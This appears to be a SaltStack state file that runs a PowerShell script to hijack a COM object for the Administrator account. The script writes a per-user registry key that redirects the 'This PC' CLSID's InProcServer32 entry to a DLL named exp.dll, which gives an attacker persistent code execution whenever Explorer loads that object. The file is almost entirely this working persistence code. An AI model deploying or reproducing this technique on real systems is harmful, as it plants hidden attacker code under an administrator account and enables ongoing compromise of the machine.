com_hijack_admin:
  cmd.run:
    - name: |
        $user = 'Administrator'
        try {
            $sid = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).Value
            Write-Host "Found SID for $user: $sid"
            
            # Note: This requires the Administrator's hive to be loaded (i.e., logged in).
            # If not loaded, we would need to 'reg load' their NTUSER.DAT.
            if (-not (Test-Path "Registry::HKEY_USERS\$sid")) {
                Write-Warning "Administrator hive (HKEY_USERS\$sid) is NOT loaded. Persistence will fail if user is not logged in."
            }

            $keyPath = "Registry::HKEY_USERS\$sid\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32"
            
            # Create keys
            New-Item -Path $keyPath -Force | Out-Null
            
            # Set default value (path to DLL)
            # Note: Using .SetValue($null, ...) sets the (Default) value of the key
            (Get-Item -Path $keyPath).SetValue($null, "C:\Program Files (x86)\Internet Explorer\exp.dll")
            
            # Set ThreadingModel
            New-ItemProperty -Path $keyPath -Name "ThreadingModel" -Value "Apartment" -PropertyType String -Force | Out-Null
            
            Write-Host "Successfully hijacked COM for $user ($sid)"
        } catch {
            Write-Error "Failed to hijack COM: $_"
            exit 1
        }
    - shell: powershell

